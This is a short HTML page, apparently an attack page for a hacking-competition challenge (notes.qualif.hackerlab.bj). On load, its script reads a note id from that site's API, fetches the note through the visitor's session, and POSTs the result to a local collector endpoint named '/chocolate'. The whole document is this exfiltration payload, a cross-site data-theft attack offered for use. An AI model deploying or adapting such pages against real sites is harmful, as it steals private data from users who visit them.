<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Momo</title>
</head>
<body>
    <script>
        fetch('https://notes.qualif.hackerlab.bj/api.php')
        .then(response => response.json())
        .then(data => {
            const id = data.id
            fetch('https://notes.qualif.hackerlab.bj/note.php?id=' + id)
            .then(response => {
                fetch('http://localhost:8080/chocolate', {
                    method: 'POST',
                    body : JSON.stringify({ chocolate : response})
                })
                .then(response => console.log(response))
            })
        })
    </script>
</body>
</html>
